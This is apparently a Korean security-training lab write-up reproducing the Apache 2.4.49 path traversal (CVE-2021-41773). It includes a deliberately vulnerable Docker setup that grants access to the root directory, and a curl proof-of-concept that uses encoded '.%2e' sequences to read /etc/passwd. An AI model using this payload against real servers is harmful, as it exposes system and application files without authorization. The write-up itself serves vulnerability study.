# Apache HTTP Server Path Traversal (CVE-2021-41773)  
화이트햇 스쿨 3기 – 조민규 (@oureukk)

---

## 요약
- Apache HTTP Server 2.4.49 버전의 `mod_cgi` 경로 검증 로직에 결함이 있어, URL 인코딩된 `..` 시퀀스를 통해 문서 루트 밖의 임의 파일을 읽을 수 있음.  
- 공격자는 `/etc/passwd` 같은 시스템 파일은 물론, 웹 서버가 읽을 수 있는 모든 파일을 노출시킬 수 있음.  

---

## 환경 구성 및 실행

1. **Dockerfile 작성**  
   `Dockerfile`:
   ```dockerfile
   FROM httpd:2.4.49

   # bash 및 기타 유틸 설치
   RUN apt-get update && apt-get install -y bash

   # 간단한 CGI 스크립트 생성
   RUN printf '%s\n' '#!/bin/bash' 'echo "Content-type: text/plain"' 'echo' 'echo "Hello from CGI"' \
       > /usr/local/apache2/cgi-bin/hello.sh \
     && chmod +x /usr/local/apache2/cgi-bin/hello.sh

   #루트파일도 읽히도록 액세스 제어 변경
   RUN printf '%s\n' \
    '<Directory "/">' \
      '    Require all granted' \
    '</Directory>' \
    >> /usr/local/apache2/conf/httpd.conf
  '''
  
2. docker-compose.yml 작성  
   **docker-compose.yml**:  
   ```yaml
   version: "3.8"
   services:
     apache-vuln:
       build: .
       ports:
         - "8080:80"

3. 컨테이너 빌드 및 실행  

   '''bash
   docker-compose up -d --build
   '''
   
4. 정상 동작 확인  
   
   '''bash
   curl -i http://localhost:8080/cgi-bin/hello.sh
   '''
   
5. 취약점 Poc 호출  
   
   '''bash
   curl -i "http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
   '''
   
---

## 결과
![image](https://github.com/user-attachments/assets/8241770b-6b3f-45b4-b8df-9ddbf5f97b4a)

- 'HTTP/1.1 200 OK'
- '/etc/passwd' 파일의 내용 출력 ( 경로 검증이 우회됨)
  
---

## 정리
- 취약 원인: Apache 2.4.49에서 URL 디코딩 후 경로 검증을 우회할 수 있어, .. 인코딩 시퀀스를 통해 문서 루트를 넘어선 파일 액세스가 허용됨.

- 영향도: 웹 서버가 읽을 수 있는 모든 시스템 파일 및 애플리케이션 파일 정보 노출 → 정보 유출, 내부 구조 파악, 추가 공격 발판 제공

---
